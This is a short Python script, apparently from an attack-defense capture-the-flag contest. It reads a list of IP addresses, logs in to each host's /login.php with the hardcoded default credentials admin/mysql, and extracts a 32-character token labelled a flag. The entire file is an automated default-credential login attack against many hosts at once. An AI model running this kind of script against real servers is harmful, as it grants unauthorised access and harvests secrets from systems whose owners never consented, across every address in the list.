import requests
import re

f = open('ip.txt','r')
for i in f.readlines():
    url = 'http://'+i.strip()+'/login.php'
    user_passwd = { 'username':'admin',
                    'password':'mysql',
                    'button':'SIGN-i'}
    r = requests.post(url,data=user_passwd)
    result = re.search('[a-z0-9]{32}',r.text)
    if r.status_code==200:
        print(url,result.group())
    else:
        print(url,"There is no flag here")
f.close()
